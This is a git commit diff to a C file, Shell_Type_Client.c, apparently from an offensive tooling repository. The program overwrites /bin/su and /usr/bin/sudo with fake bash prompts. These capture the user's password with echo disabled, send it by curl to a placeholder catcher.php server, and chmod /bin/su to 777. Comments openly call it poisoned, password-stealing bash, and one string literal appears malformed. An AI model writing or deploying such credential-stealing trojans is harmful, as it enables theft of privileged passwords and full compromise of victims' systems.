02e374e6ad9d70ff6cf31664a355006287ab1bc0
Eduardo <41192980+blueudp@users.noreply.github.com>
2018-09-21 09:59:33 +0200

    Update Shell_Type_Client.c

--- files/Shell_Type_Client.c
+++ files/Shell_Type_Client.c
@@ -36,28 +36,23 @@ int main () {
     char cmmd1[200] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" \n sudo mv /usr/su /usr/bin/su" > /dev/null 2>&1 \n";
     file1 = fopen("/bin/su", "w");
 
-   if(file1 == NULL) {
+    if(file1 == NULL) {
+        printf("Err.: Try executing me again...");
+    } else {
+        fwrite(cmmd1, sizeof(cmmd1), 1, file1);
+        fclose(file1);
+    }
 
-	printf("Err.: Try executing me again...");
+    /** GIVE 777 **/
+
+    system("chmod 777 /bin/su > /dev/null 2>&1");
+
+    /** OVERWRITE /BIN/SU WITH POISONED BASH THAT STEPS THE PASSWORDS **/ 
+
+    FILE *file2;
 	
-   } else {
-
-	fwrite(cmmd1, sizeof(cmmd1), 1, file1);
-
-	fclose(file1);
-	
-   }
-
-/** GIVE 777 **/
-
-system("chmod 777 /bin/su > /dev/null 2>&1");
-
-
-/** OVERWRITE /BIN/SU WITH POISONED BASH THAT STEPS THE PASSWORDS **/ 
-
-
-   FILE *file2;
    /** MALICIUS BASH, ASK FOR PASSWD, SEND TO SERVER, FIX SUDO  **/
+	
    char cmmd2[200] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" \n sudo mv /usr/sudo /usr/bin/sudo > /dev/null 2>&1 \n"; 
    file2 = fopen("/usr/bin/sudo", "w");
    if(file2 == NULL) {
